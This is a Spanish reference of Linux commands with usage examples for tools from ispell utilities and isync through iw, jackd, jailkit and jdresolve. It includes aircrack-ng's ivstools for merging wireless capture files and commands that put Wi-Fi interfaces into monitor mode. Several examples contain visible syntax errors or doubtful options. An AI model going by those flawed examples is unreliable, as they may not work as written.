$ ijoin mis_palabras.txt mis_afijos.aff > entrada_buildhash.txt (unir un archivo de palabras y un archivo de afijos en un formato que puede ser directamente procesado por buildhash)
$ munchlist diccionario_completo.txt reglas.aff > diccionario_comprimido.txt (toma un archivo de palabras y, utilizando las reglas de afijos, genera un diccionario más compacto)
$ tryaffix mis_reglas.aff feliz (probar si una palabra dada puede formarse aplicando reglas de afijos de un archivo de afijos a una palabra base conocida)


ispell-autobuildhash
Es un script que gestionará los archivos hash de ispell autobuild, destinados a ser llamados desde las herramientas comunes de los diccionarios. Dependiendo del nivel de compatibilidad ispell y del nivel de compatibilidad utilizado para el archivo hash si está presente, decidirá si debe ser reconstruido o no. Este script solo funcionará en paquetes ispell preparados para usarlo, no hará nada por otros paquetes de diccionarios ispell.
# ispell-autobuildhash --force


isrcsubmit
Es una utilidad para extraer los Códigos Internacionales Estándar de Grabación [International Standard Recording Codes - ISRC] que están incrustados en los CDs de audio y los envia automaticamente a MusicBrainz para enriquecer su base de datos. Los ISRC se utilizan para identificar de forma única grabaciones de sonido y video musical. Se requiere una cuenta válida de MusicBrainz para enviar los ISRC.
$ isrcsubmit --setup (configurar las credenciales de MusicBrainz. Pedira nombre de usuario de MusicBrainz, contraseña y email)
$ isrcsubmit --verbose (extraer ISRCs del CD en /dev/cdrom y enviarlos a MusicBrainz y mostrar información detallada del proceso)
$ isrcsubmit -d /dev/sr1 (especificar un dispositivo de CD diferente)
$ isrcsubmit --dry-run (solo mostrar los ISRCs encontrados sin enviarlos)
$ isrcsubmit --release-id a1b2c3d4-e5f6-7890-abcd-ef1234567890 (especificar un release específico si se conoce el MBID [MusicBrainz ID])
$ isrcsubmit --server test.musicbrainz.org (uUsar un servidor MusicBrainz diferente para testing)
$ isrcsubmit --tracks 1,3,5 (procesar solo ciertas pistas)
Nota.- No todos los CDs tienen ISRCs especialmente los más antiguos pueden no tenerlos


issue.net
Muestra la distro instalada.
$ cat /etc/issue.net


istgt
Es un demonio de destino iSCSI [Internet Small Computer Systems Interface] para sistemas operativos tipo Unix que se ejecuta como proceso en espacio de usuario, no en el núcleo del sistema operativo. istgt es el protocolo usado comúnmente para controlar discos duros y otros dispositivos de almacenamiento a través de una red IP, como Ethernet. Es una forma de implementar almacenamiento en red [SAN, Storage Area Network] usando tecnología estándar de red. En iSCSI hay dos roles principales: Iniciador iSCSI [iSCSI initiator] es el cliente. Es el sistema que se conecta al almacenamiento remoto como si fuera un disco local y Destino iSCSI [iSCSI target], el servidor. Es el sistema que expone su almacenamiento para ser usado remotamente por un iniciador.
Ejemplo de uso práctico: Configurar un destino iSCSI con istgt en un servidor con un disco /dev/sdb que se quiere compartir por iSCSI para que otro equipo lo use remotamente.
# nano /etc/istgt/istgt.conf
[Global]
  NodeBase "iqn.2025-06.com.ejemplo:servidor"
  PidFile "/var/run/istgt.pid"
  AuthFile "/etc/istgt/auth.conf"
  MediaDirectory "/var/istgt"
  LogFacility "local7"
[UnitControl]
  UnitName "ctl"
  AuthMethod CHAP
  Portal "127.0.0.1:3261"
Ejemplo de entrada:
# nano /etc/istgt/istgttarget.conf
[LogicalUnit1]
  TargetName "iqn.2025-06.com.ejemplo:disco1"
  Mapping PortalGroup1 InitiatorGroup1
  AuthMethod CHAP
  UseDigest Auto
  ReadOnly No
  UnitType Disk
  LUN0 Storage /dev/sdb Auto
# systemctl enable istgt (habilitar servicio al arranque)
Desde otro equipo, el cliente, se puede conectar.
# iscsiadm -m discovery -t sendtargets -p IP_DEL_SERVIDOR
# iscsiadm -m node --login
Después de conectarse el cliente se verá el disco remoto como si fuera un disco local, porejemplo /dev/sdc.


isympy
Es un shell de Python para SymPy. Es solo un shell python normal [ipython shell si está instalado el paquete ipython]. Para salir: exit()
$ isympy -p no -c python (iniciar la shell sin decoración extra)


isync
También conocido como "mbsync" es una aplicación que sincroniza buzones de correo entre un servidor IMAP y un sistema local usando formato Maildir. Los mensajes nuevos, eliminados y modificados se pueden propagar en ambos sentidos. isync es adecuado para su uso en modo desconectado de IMAP. Incluye las herramientas mbsync-get-cert y mdconvert.
Crear el archivo de configuración básico
        $ nano ~/.mbsyncrc
        # Configuración del servidor IMAP
        IMAPAccount work
        Host imap.example.com
        User tuusuario
        Pass tucontraseña
        SSLType IMAPS
        #
        # Configuración del buzón remoto
        IMAPStore work-remote
        Account work
        #
        # Configuración del buzón local (Maildir)
        MaildirStore work-local
        Path ~/Mail/work/
        Inbox ~/Mail/work/Inbox
        #
        # Definición de un canal de sincronización
        Channel work-inbox
        Master :work-remote:INBOX
        Slave :work-local:INBOX
        Create Both
        Expunge Both
        SyncState *
$ mbsync -a (sincronizar todos los canales configurados)
$ mbsync work-inbox (sincronizar un canal específico)
$ mbsync --new work-inbox (sincronizar solo los nuevos mensajes sin eliminar nada)
$ mbsync --all --pull --push work-inbox (forzar una sincronización completa)
$ mbsync --expunge work-inbox (sincronizar eliminando mensajes marcados para borrar)
$ mbsync --dry-run work-inbox (mostrar diferencias sin alterar datos)
$ mbsync --push work-inbox (subir cambios al servidor)
$ mbsync-get-cert imap.example.com:993 > imap_example_com.pem (descarga el certificado del servidor imap.example.com [puerto 993] y lo guarda en un archivo .pem)
$ mbsync -dV nombre_canal (muestran detalles técnicos o problemas de autentificación)
$ mbsync-get-cert no verifica la validez del certificado, solo lo descarga. Luego se puede añadir en el archivo de configuraciónc para usar ese certificado
$ nano ~/.mbsyncrc`
        IMAPAccount work
        Host imap.example.com
        SSLType IMAPS
        # Ruta al certificado descargado
        CertificateFile ~/imap_example_com.pem
Nota.- Para leer y organizar los correos localmente se puede usar Mutt, Neomutt u otro cliente
$ mdconvert --to=Maildir --mbox ~/correo_viejo.mbox ~/Mail/nuevo_maildir/ (convertir de mbox, usado por Thunderbird a Maildir para usar con mbsync)
$ mdconvert --to=mbox --maildir ~/Mail/original_maildir/ ~/correo_exportado.mbox (convertir de Maildir a mbox para compatibilidad con otros clientes)


isutf8
[moreutils]. No muestra salida si el archivo tiene una codificación UTF-8 válida. Si no es el caso muestra el aviso.
$ isutf8 archivo


itamae
es una herramienta sencilla y ligera de gestión de configuración inspirada en Chef. Cuenta con un DSL similar al de Chef, solo recetas [recipes] y es idempotente lo que significa que aplicar la misma receta varias veces no genera efectos secundarios adicionales.
$ itamae local recipe.rb (ejecutar recetas localmente)
$ itamae ssh --host ejemplo.com recipe.rb (ejecución remota por SSH)
$ itamae ssh --vagrant --host vm_name recipe.rb (ejecución en Vagrant?
1.-
Una receta en Itamae es un archivo Ruby, por ejemplo, recipe.rb que define los recursos y acciones deseadas. Por ejemplo, instalar y habilitar Nginx:
$ nano recipe.rb
        package 'nginx' do
          action :install
        end
        #
        service 'nginx' do
          action [:enable, :start]
        end
$ itamae local recipe.rb (aplicar esta receta localmente)
2.-
Otro ejemplo un poco más complejo
Instalar Nginx, renderizar un archivo de configuración desde una plantilla, y reiniciar el servicio si la configuración cambia:
$ nano recipe.rb
        service 'nginx' do
          action [:enable, :start]
        end
        #
        template "/etc/nginx/sites-available/main" do
          source "templates/etc/nginx/sites-available/main.erb"
          mode "0644"
          action :create
          notifies :restart, "service[nginx]", :delayed
        end


itop
Cuando un componente del hardware necesita un recurso, envia una petición de interrupción al sistema llamado IRQ y este suspende momentáneamente alguna rutina de servicio para continuarla cuando finaliza la interrupción. itop muestra estas interrupciones que vendrian a ser lo mismo que actualizar cada segundo el archivo /porc/interrupts:
	# watch -n 1 cat /proc/interrupts
# itop
Cuando está en ejecución, las teclas de control son:
	a (Muestra todos los procesos, no solo los en uso)
	t (Muestra el clásico top [ver])
	q (Sale de "t" cierra la aplicación)
# itop -n 10 (Sólo muestra 10 procesos)


its-playback-time
[It's PlayBack Time]. Herramienta diseñada para reproducir grabaciones de terminal creadas con ttyrec [ver] y que permite avanzar y retroceder con precisión.
Para usar ipbt, primero se necesita una grabación de ttyrec:
$ ttyrec (empieza la grabación que se guarda con el nombre ttryrecord y se entran los siguientes comandos)
        $ tty
        $ who
        $ ip a
        $ pwd
        $ uname -a
        $ exit
$ ipbt ttyrecord (reproducir la grabación)
b --> retrocede
p --> reproduce automaticamente
Barra espaciadora --> va ejecutando paso a paso
q --> salir de la reproducción


itstool
Utilidad que convierte archivos XML a archivos PO [Portable Object], utilizados comúnmente en la localización y traducción de software y documentación, y luego vuelve a aplicar las traducciones al XML original. Se basa en el estándar ITS [Internationalization Tag Set] del W3C, el cual permite marcar en documentos XML qué partes son traducibles y cómo deben procesarse.
Ejemplo sencillo
$ nano ejemplo.xml
        <?xml version="1.0"?>
        <page xmlns="http://projectmallard.org/1.0/">
          <title>Hola mundo</title>
          <p>Este es un párrafo traducible.</p>
        </page>
$ itstool -o po/ ejemplo.xml (crea un archivo POT/PO en el directorio [po/ejemplo.pot])
Crear un archivo .po traducido al inglés
$ nano po/en.po
        msgid "Hola mundo"
        msgstr "Hello world"
        msgid "Este es un párrafo traducible."
        msgstr "This is a translatable paragraph."
$ itstool -m po/en.po -o traducido/ ejemplo.xml (crea una versión traducida del XML en el directorio traducido/)


iucode-tool
Herramienta para manipular y actualizar el microcódigo de procesadores Intel® x86 y x86-64 y utiliza las funciones del kernel para actualizarlo. El microcódigo son actualizaciones de firmware que Intel proporciona para corregir errores, vulnerabilidades o mejorar el rendimiento del CPU.
# iucode-tool -l /usr/share/intel-microcode/intel-microcode.bin (muestra información sobre las revisiones de microcódigo disponibles en el archivo binario)
# iucode-tool -S 0x000306a9 -w updated_microcode.bin /usr/share/intel-microcode/intel-microcode.bin (extraer microcódigo para un CPU específico y guardar el resultado en un nuevo archivo binario)
Nota.- Filtra el microcódigo para un CPU con signature 0x000306a9 que puede obtenerse con cat /proc/cpuinfo.
# iucode-tool -t /usr/share/intel-microcode/ -K /lib/firmware/intel-ucode/ ((selecciona automáticamente el microcódigo correcto para el CPU actual y carga el microcódigo en el kernel)
# iucode-tool -w combined_microcode.bin file1.bin file2.bin (combinar múltiples archivos de microcódigo)
# iucode-tool -C -l /usr/share/intel-microcode/intel-microcode.bin (compara el microcódigo actual del CPU con el disponible en el archivo por si hay una actualización)
Nota.- El paquete intel-microcode instala los archivos en /usr/share/intel-microcode/ y el kernel carga el microcódigo desde /lib/firmware/intel-ucode/


ivstools
[aircrack-ng]
Herramienta para unir/convertir archivos .ivs y .cap
$ ivstools --merge captura1.ivs captura2.ivs captura3.ivs total.ivs
$ ivstools --captura.cap nuevo.ivs


ivy
Es un gestor de dependencias, orientado a la gestión de dependencias de Java, aunque puede utilizarse para gestionar dependencias de cualquier tipo de proyecto. El funcionamiento básico de Ivy se basa en un archivo descriptor llamado ivy.xml, donde se declaran las dependencias del proyecto y sus configuraciones. Ivy se encarga de resolver estas dependencias, descargarlas desde repositorios configurados y organizarlas en el proyecto de acuerdo a las reglas definidas.
Archivo de ejemplo ubicado en la raíz del proyecto
$ nano ivy.xml
        xml
        <ivy-module version="2.0">
          <info organisation="miempresa" module="mimodulo"/>
          <dependencies>
            <dependency org="org.apache.commons" name="commons-lang3" rev="3.12.0"/>
          </dependencies>
        </ivy-module>
Este ejemplo indica que el proyecto depende de la librería commons-lang3 versión 3.12.0.
Para utilizar Ivy con Ant, se debe declarar el uso de las tareas de Ivy en el archivo build.xml y luego invocar tareas como "resolve" y "retrieve" para gestionar las dependencias
$ nano build.xml
        <project name="ejemplo" default="resolve" xmlns:ivy="antlib:org.apache.ivy.ant">
          <target name="resolve" description="Resuelve dependencias">
            <ivy:resolve/>
            <ivy:retrieve sync="true" type="jar"/>
          </target>
        </project>
Descarga las dependencias declaradas en ivy.xml y copia los archivos descargados, por ejemplo, los .jar a un directorio del proyecto, como lib/.
$ ant resolve (descargará las dependencias y las dejará disponibles en el directorio especificado)
$ ant retrieve (copia las dependencias descargadas a un directorio específico del proyecto)


ivyplusplus
[ipp]. Herramienta que amplía Apache Ivy, que a su vez es un sistema de gestión de dependencias para proyectos Java.
$ apt show ivyplusplus (verificar instalación)
$ dpkg -L ivyplusplus | grep jar (ya que no tiene un ejecutable estándar visible [/usr/bin/ipp] buscar el ejecutable)
$ java -jar /usr/share/java/ivyplusplus.jar (ejecutar la herramienta)
$ java -jar /usr/share/ivyplusplus/ivyplusplus.jar new myproject (crear un nuevo proyecto)
Creará un nuevo directorio myproject/ con:
        src/
        lib/
        build.xml [para Ant]
        ivy.xml [para definir dependencias]
        ivysettings.xml
$ java -jar /usr/share/ivyplusplus/ivyplusplus.jar eclipse (añadir soporte para Eclipse)
$ java -jar /usr/share/ivyplusplus/ivyplusplus.jar antbuild (lee ivy.xml y crea un build.xml que compila el proyecto con Ant y resuelve dependencias con Ivy)
Para que el comando ipp esté disponible globalmente, crear un alias y añadirlo a ~/.bashrc:
$ alias ipp='java -jar /usr/share/ivyplusplus/ivyplusplus.jar'
Luego se podrá usar como:
$ ipp new myproject
$ ipp eclipse
$ ipp antbuild


iw
Este paquete que permite configurar y mostrar información sobre dispositivos inalámbricos, se basa en la interfaz del kernel nl80211, es compatible con la mayoría del hardware reciente y substituye a la antigua herramienta iwconfig.
$ iw dev (listar todas las interfaces inalámbricas disponibles)
# iw dev wlan0 scan | grep "SSID:" (escanear y listar las redes inalámbricas disponibles)
# iw dev wlan0 connect "MiRedWiFi" (conectarse a una red inalámbrica)
# iw dev wlan0 info (obtener información detallada sobre una interfaz inalámbrica específica)
# iw dev wlan0 set channel 11 (cambiar el canal de una interfaz inalámbrica)
# iw dev wlan0 scan (obtener información detallada sobre las redes disponibles)
# iw dev wlan0 set type monitor (cambiar el modo de una interfaz inalámbrica, por ejemplo, a modo monitor)
$ iw list (listar los dispositivos físicos inalámbricos disponibles)


iwatch
Programa basado en Perl que utiliza el subsistema inotify del kernel de Linux para monitorizar eventos en el sistema de archivos [creación, modificación, eliminación, acceso, etc.] en tiempo real, con la capacidad de ejecutarse como un comando simple o como un demonio.
$ iwatch -r -c "echo 'Archivo creado: %f' | mail -s 'Evento detectado' usuario@ejemplo.com" /tmp/test (monitorizar un directorio y enviar un correo cuando se cree un archivo)
$ iwatch -r -v /tmp/test (monitorear el directorio)
$ iwatch -r -e create -c "echo 'Archivo creado: %f'" /tmp/test (mostrar un mensaje cada vez que se crea un archivo)
Algunos eventos soportados [-e]:
        access --> Un archivo fue leído.
        modify --> Un archivo fue modificado.
        create --> Se creó un archivo o directorio.
        delete --> Se eliminó un archivo o directorio.
$ iwatch -r -e modify -m usuario@ejemplo.com /tmp/test (enviar un correo cada vez que se modifica un archivo)
Para ejecutar iwatch como demonio, se necesita un archivo de configuración XML:
# nano  /etc/iwatch/iwatch.xml
        <?xml version="1.0" ?>
        <!DOCTYPE config SYSTEM "/usr/share/iwatch/iwatch.dtd">
        <config>
          <guard email="admin@ejemplo.com" name="Admin"/>
          <watchlist>
            <title>Monitoreo de /tmp/test</title>
            <contactpoint email="usuario@ejemplo.com" name="Usuario"/>
            <path type="recursive" events="create,delete,modify" exec="echo 'Evento: %e en %f' >> /var/log/iwatch.log">
              /tmp/test
            </path>
          </watchlist>
        </config>
# iwatch -d -f /etc/iwatch/iwatch.xml (inicia iwatch en modo demonio, monitoreando /tmp/test y registrando eventos en /var/log/iwatch.log)
$ iwatch -r -e create -X '\.log$' /tmp/test (monitorear /tmp/test pero excluir archivos que terminen en .log)


iwconfig
Relacionado con direcciones ip y dispositivos de red inalámbricos
# iwconfig (Ver los datos de conección de la red inalámbrica)
# iwconfig eth0 (Si se asocia la tarjeta de red con la conección)
# iwconfig wlan0 mode Managed  (activar el modo managed)
# iwconfig wlan0 mode monitor (activar modo monitor)
# iwconfig wlan0 key open CLAVE  (ingresar contraseña, si la hay. Si omitimos “open” se interpreta que la clave es “restricted”)
# iwconfig wlan0 essid ESSID (ESSID= nombre de la red)
Crear una Red Wifi AdHoc
$ iwconfig wlan0 mode Ad-Hoc
$ iwconfig wlan0 essid "nombre_de_la_red"
$ iwconfig wlan0 key s:clave
$ ifconfig wlan0 xx.xx.xx.xx netmask yy.yy.yy.yy


iwd
[Inet Wireless Daemon]. Demonio que proporciona una forma eficiente de gestionar las conexiones de red inalámbricas. Incluye las herramientas iwctl y iwmon
# systemctl status iwd (ver el estado del servicio)
# iwctl device list (mostrará una lista de dispositivos, incluyendo su nombre, estado y dirección MAC)
# iwctl device wlp2s0 set-property Powered true (encender un dispositivo)
# iwctl device wlp2s0 set-property Powered false (apagarlo)
# iwmon (monitorear el tráfico de paquetes y los eventos del demonio iwd)
# iwctl station wlp2s0 get-networks (ver redes disponibles)
# iwctl known-networks eth0 forget (hacer que un dispositivo olvide una red específica)


iwlist
# iwlist eth0 scan  (scaneo de los puntos de acceso cercanos)
# iwlist s    (Lo mismo para todas las interficies)


j2cli
Comando para crear plantillas en scripts de shell
$ j2 -f template.j2 -o output.sh (generar un script de inicio)
$ j2 -f template.j2 -o output.sh --var "variable_name=value" (generar un script de inicio con variables)
$ j2 -f /path/to/template.j2 -o /path/to/output.sh --var "variable1=value1" --var "variable2=value2" (y con multiples variables)
$ j2 -f /path/to/template.j2 -o /path/to/output_*.sh --count 3 (generará tres archivos con nombres como output_0.sh, output_1.sh y output_2.sh)
Nota.- Se necesita tener un archivo .j2 [Jinja2] con la estructura del script de shell para que j2cli pueda procesarlo y generar el resultado final.


jaaa
[JACK and ALSA Audio Analyser] Es un generador de señales de audio y analizador de espectro diseñado para realizar mediciones precisas en audio digital. Permite trabajar tanto con el servidor JACK como con dispositivos ALSA, facilitando el análisis de señales y la visualización de su espectro en tiempo real.
$ jaaa -J (inicia "jaaa" utilizando el servidor de audio JACK)
$ jaaa -A (inicia "jaaa" usando ALSA, el sistema de audio estándar de Linux)
$ jaaa -A -d hw:1,0 -r 44100 (inicia "jaaa" con ALSA, usando el dispositivo de hardware hw:1,0 y una frecuencia de muestreo de 44.1 kHz)
Las opciones por defecto son:
-d hw:0.0 --> Dispositivo ALSA
-r 48000 --> Frecuencia de muestreo
-p 1024 --> Tamaño de periodo
-n 2 --> Número de fragmentos


jack-capture
Programa para grabar archivos de sonido con Jack. Con este programa puedes grabar, en todos los formatos compatibles con sndfile (WAV, AIFF, OGG, FLAC, WaveX, AU, etc.), cualquier sonido reproducido a través de Jack
$ jack-capture output.wav (grabará todo el audio que pasa por la conexión JACK durante la ejecución del programa y lo guardará como un archivo WAV)
$ jack-capture -f ogg output.ogg (grabará el audio en formato OGG Vorbis)
$ jack-capture -c 2 output.aiff (grabará el audio en estéreo [2 canales] y lo guardará como un archivo AIFF)
$ jack-capture -b 1024 output.flac (establece el tamaño del buffer en 1024 muestras)
$ jack-capture -l (mostrará una lista de todas las conexiones disponibles)
$ jack-capture -n 0 output.au (grabaría solo el primer canal)


jackd
[jackd2]. JACK [JACK Audio Connection Kit] es un servidor de sonido de baja latencia que permite que varias aplicaciones se conecten a un dispositivo de audio y compartan audio entre ellas. Incluye los siguientes ejecutables: alsa_in, alsa_out, jack_alias, jack_bufsize, jack_connect, jack_control, jack_cpu, jack_cpu_load, jack_disconnect, jack_evmon, jack_freewheel, jack_iodelay, jack_latent_client, jack_load, jack_lsp, jack_metro, jack_midi_dump, jack_midi_latency_test, jack_midiseq, jack_midisine, jack_monitor_client, jack_multiple_metro, jack_net_master, jack_net_slave, jack_netsource, jack_property, jack_rec, jack_sampleraten, jack_server_control, jack_session_notify, jack_showtime, jack_simdtests, jack_simple_client, jack_simple_session_client, jack_test, jack_thru, jack_transport, jack_unload, jack_wait, jack_zombie, jackd y jackdbus. Crear el archivo:
# nano /etc/security/limits.d/audio.conf
Y en el pegar las lineas:
USER   -  rtprio     95
USER   -  memlock    unlimited
En USER el que corresponda.
$ jackd -d alsa (inicia el servidor jackd utilizando el controlador ALSA)
$ jackd -d alsa -d hw:0 (especificar qué interfaz de audio deseas usar. hw:0, que corresponde a la primera tarjeta de sonido)
$ jackd -d alsa -r 48000 -p 256 (ajustar la latencia y calidad del audio a una tasa de muestreo de 48 kHz y un tamaño de búfer de 256 muestras)
$ jackd -d firewire (iniciar jackd con el controlador firewire)
$ jackd -d dummy (útil cuando no necesitas audio físico, pero aún deseas realizar conexiones entre aplicaciones. Se utiliza normalmente para pruebas)
$ jackd -R -d alsa (mejorar el rendimiento ejecutando jackd en modo tiempo real)
$ jackd -d alsa -r 44100 -p 512 & (que las aplicaciones que usan PulseAudio, como los reproductores de música, es común iniciar JACK y luego conectar ambos servidores)
$ pactl load-module module-jack-source
$ pactl load-module module-jack-sink
$ jackd -d alsa -P hw:0 -C hw:1 (seleccionar dispositivos de entrada y salida, -P: especifica el dispositivo de salida y -C: especifica el dispositivo de entrada)
El argumento "help" se puede usar con el dispositivo elegido:
              jackd -d alsa --help
              jackd -d coreaudio --help
              jackd -d net --help
              jackd -d dummy --help
              jackd -d firewire --help
              jackd -d oss --help
              jackd -d sun --help
              jackd -d portaudio --help


jackmeter
Permite monitorizar en tiempo real los niveles de señal de uno o varios puertos de audio JACK en ordenadores remotos sin necesidad de sistemas gráficos.
$ jack_meter alsa_pcm:capture_1 (muestra una barra que representa el nivel de señal del puerto de entrada principal del sistema de audio JACK)
$ jack_meter alsa_pcm:capture_1 alsa_pcm:capture_2 (mezcla y muestra los niveles de ambos canales de entrada)
$ jack_meter -f 20 alsa_pcm:capture_1 (cambiar la frecuencia de actualización a 20 veces por segundo)
$ jack_meter -n alsa_pcm:capture_1 (en vez de una barra, se imprime el nivel en decibelios [dB])
$ jack_meter -w 40 alsa_pcm:capture_1 (el medidor ocupará solo 40 caracteres de ancho en la terminal)


jacktrip
Herramienta diseñada para transmitir audio de alta calidad, sin comprimir y con baja latencia a través de redes, como Internet, permitiendo colaboraciones musicales en tiempo real entre músicos ubicados en diferentes lugares. Admite cualquier número de canales, tantos como el ordenador o la red pueda gestionar, de transmisión de señales de audio bidireccionales.
$ jacktrip -s -p 4464 --broadcast (modo servidor, el puerto y enviar audio a todos los clientes conectados)
$ jacktrip -c 192.168.1.100 -p 4464 (conectarse al servidor en modo cliente y la IP del servidor)
$ jacktrip -s -p 4464 -n 8 (especificar número de canales a 8 entradas/salidas)
$ jacktrip -c 192.168.1.100 -p 4464 --bitres 16 (reducir ancho de banda [ligera pérdida de calidad])
$ jacktrip -m -p 4464 --peer <IP1> --peer <IP2> (conexiones directas entre múltiples músicos)
Ejemplo de flujo
Servidor
$ jackd -d alsa --device hw:0 --rate 48000 --period 128 &
$ jacktrip -s -p 4464
Cliente
$ jackd -d alsa --device hw:0 --rate 48000 --period 128 &
$ jacktrip -c <IP_servidor> -p 4464
Para conectar envío/recepción se pueden usar herramientas gráficas como qjackctl, Sonobus, jamulus...


jailkit
Herramientas que permiten restringir el entorno de un usuario a un conjunto limitado de archivos o comandos mediante el uso de la técnica chroot, creando lo que se conoce como "jaulas" o "jails". Los entornos se pueden personalizar en /etc/jailkit/jk_init.ini. Proporciona los siguientes comandos: jk_check, jk_chrootlaunch, jk_chrootsh, jk_cp, jk_init, jk_jailuser, jk_list, jk_lsh, jk_socketd, jk_uchroot y jk_update.
# jk_init -v /home/jail sftp (inicializa un entorno de jaula chroot con soporte para SFTP)
# jk_jailuser -m -j /home/jail usuario (mueve a usuario dentro de la jaula /home/jail y "-m" mueve el contenido de su home dentro de la jaula)
# jk_cp /home/jail /usr/bin/top (copia el binario top y sus dependencias a la jaula /home/jail)
# jk_list (lista los usuarios dentro de una jaula)
# jk_check /home/jail (verifica si la jaula está bien configurada)
# jk_update /home/jail (actualiza binarios en una jaula según lo que esté definido en jk_init.ini)
# jk_chrootlaunch -j /home/jail /bin/bash (lanza procesos o da acceso a usuarios temporales en una jaula)
jk_lsh es una shell limitada que permite solo ejecutar ciertos comandos predefinidos. Se configura .jk_lshrc.
jk_socketd solo permite el uso de sockets dentro de una jaula, útil si el usuario necesita redes.
jk_chrootsh es una Shell que lanza al usuario dentro de una jaula al iniciar sesión y se configura en /etc/passwd con la linea:
        usuario:x:1001:1001::/home/jail/./home/usuario:/usr/sbin/jk_chrootsh
Previamente se tiene que crear un usuario:
# useradd -m -s /usr/sbin/jk_chrootsh usuario
Y agregarlo a la jaula:
# jk_jailuser -m -j /home/jail usuario
Y crear permisos:
# chown root:root /home/jail
# chmod 755 /home/jail
# # jk_check /home/jail (verificar)


jalv
Herramienta para ejecutar plugins LV2 como aplicaciones independientes, conectándolos al sistema de audio JACK. Los plugins LV2 son un estándar de plugins de audio modular y extensible, comúnmente usados en aplicaciones de producción musical y procesamiento de señales.
# jalv http://calf.sourceforge.net/plugins/Compressor (ejecutar un plugin LV2 por su URI. Abre el compresor Calf Compressor como una aplicación independiente)
# jalv -n "MiEQ" http://lsp-plug.in/plugins/lv2/para_eq (ejecuta el ecualizador LSP Para EQ y lo nombra "MiEQ" en el administrador de conexiones JACK)
# jalv -c http://invadarecords.com/plugins/lv2/sc4 (ejecuta el SC4 Compressor y lo conecta directamente a las entradas/salidas de JACK)
# jalv -s (muestra todas las URIs de plugins LV2 disponibles en el sistema)


jam
Herramienta de compilación de software, sustituto de make
Ejemplo de compilación de un programa simple en C
$ nano main.c
        #include <stdio.h>
        /* Un ejemplo */
        int main() {
            printf("¡Hola, mundo desde Jam!\n");
            return 0;
        }
Para compilar esto con jam, se crea un archivo en el mismo directorio:
$ nano Jamfile:
        # Define el nombre del programa ejecutable
        Main hello : main.c ;
# --> inicia un comentario.
Main --> es una regla incorporada en jam que se usa para construir una aplicación ejecutable.
hello --> es el nombre del ejecutable que se creará.
: main.c --> especifica que hello depende del archivo main.c.
$ jam (compilar)
        ...found 12 target(s)...
        ...updating 2 target(s)...
        Cc main.o
        Link hello
        Chmod1 hello
        ...updated 2 target(s)...
$ jam clean (limpiar los archivos generados. En el ejemplo solo dejar Jamfile y main.c)


jargon
Compendio completo de jerga hacker que ilumina muchos aspectos de la tradición, el folklore y el humor hackish en lengua inglesa. El archivo está en formato de información, pero incluye una página HTML con enlaces al sitio de inicio. Este paquete está desactualizado porque el autor ya no mantiene una versión informativa del archivo.
$ jargon


java
Lenguaje de programación
$ java -jar fichero.jar  (Ejecuta un programa escrito en java)


java-package
Este paquete contiene el documento de política de Java, que describe la estructura del soporte de Java en Debian y cómo deben comportarse los paquetes Java y las preguntas frecuentes sobre Java de Debian, que proporcionan información sobre el estado del soporte de Java en Debian, los compiladores disponibles, las máquinas virtuales, los programas y bibliotecas Java, así como sobre cuestiones legales. El indice, con el navegador: file:///usr/share/doc/java-policy


java2html
Resaltar código fuente de Java y C++ para presentaciones en la Web. Analiza el código fuente y genera HTML donde las palabras clave, comentarios, cadenas de texto y otros elementos del código aparecen en diferentes colores y estilos, mejorando significativamente la legibilidad cuando se visualiza en un navegador web.
$ java2html MiClase.java (comando genera un archivo MiClase.java.html con el código resaltado)
$ java2html -o codigo_resaltado.html MiClase.java (especificar archivo de salida)
$ java2html archivo.cpp (conversión de código C++)
$ java2html -t "Mi código Java" MiPrograma.java (generar HTML con título personalizado)


jclassinfo
Herramienta para analizar archivos de clase Java y extraer información detallada sobre los elementos que contiene como las clases, métodos, constantes, campos proporcionados, dependencias, versión de la máquina virtual necesaria para ejecutarlos y otros atributos.
$ jclassinfo MiClase.class --recursive (forma básica y analizando todas las clases dentro de los arcchivos JAR o ZIP)
$ jclassinfo MiClase.class --methods (mostrar solo los métodos de una clase)
$ jclassinfo MiClase.class --dependencies (verificar las dependencias de una clase)
$ jclassinfo MiClase.class --constants (información sobre las constantes definidas)
$ jclassinfo MiClase.class --vm-version --verbose (versión de la máquina virtual requerida y com la maxima información)
$ jclassinfo MiClase.class --attributes (listar todos los atributos de una clase)
$ jclassinfo MiClase.class --method buscarNombreMétodo (buscar un método específico por nombre)
$ jclassinfo MiClase.class --inherits (verificar si una clase hereda de otra)
$ jclassinfo MiClase.class --fields --output-format json (mostrar información sobre los campos [variables] de una clase y salia en JSON)


jdns
Herramienta que permite probar distintos aspectos del funcionamiento del sistema DNS [Domain Name System]. Está pensada para evaluar cómo se comportan las peticiones DNS en distintos modos de operación, como unicast, multicast, etc.
$ jdns -d -q 3 uni src jabber.org (mostrar salida, ejecutar durante 3 segundos, consulta standard para descubrir servicios
$ jdns uni A example.com (Consulta estándar de un registro tipo A [IPv4] para example.com usando el DNS convencional)
$ jdns mul A mydevice.local (busca la IP de mydevice.local usando mDNS. Este tipo de consulta no va a servidores DNS públicos, sino que se difunde en la red local)
# jdns pub A myservice.local 192.168.1.50 (anuncia que myservice.local tiene la IP 192.168.1.50 en la red local mediante mDNS. Requiere privilegios)
$ jdns mul SRV _http._tcp.local (descubrir un servicio HTTP local con mDNS)
$ jdns uni TXT google.com (ver texto adicional de un dominio)
$ jdns uni ANY example.com (solicita todos los registros disponibles)
Modos disponibles [cómo se envía la consulta]
uni [Unicast DNS] --> Consulta estándar a través de servidores DNS configurados en el sistema
mul [Multicast DNS - mDNS] --> Consulta usando multicast DNS, típico en redes locales
pub [Publicación Multicast DNS] --> Permite publicar [anunciar] un nombre/respuesta en mDNS. Es útil para probar cómo un servicio anunciaría su presencia en una red.
Tipos de consulta [tipo de registro DNS a consultar]
A	Dirección IPv4
AAAA	Dirección IPv6
PTR	Puntero de nombre inverso
SRV	Servicio usado para descubrir servicios
TXT	Texto arbitrario, útil para metadatos)
ANY	Solicita todos los registros disponibles


jdresolve
Alternativa rápida a Apache Logresolve que resuelve direcciones IP en nombres de host en archivos de log. Para reducir el tiempo necesario para resolver grandes cantidades de direcciones, jdresolve abre muchas conexiones simultáneas a los servidores DNS y mantiene un gran número de líneas de texto en memoria. Estas líneas pueden tener cualquier contenido, siempre que las direcciones IP sean el primer campo a la izquierda. Esto suele ocurrir con la mayoría de los formatos de archivos de registro HTTP y FTP.
$ jdresolve access.log > resolved.log (resolución básica)
$ jdresolve -v -k access.log > resolved_with_ips.log (modo verbose y resolución manteniendo las IPs originales)
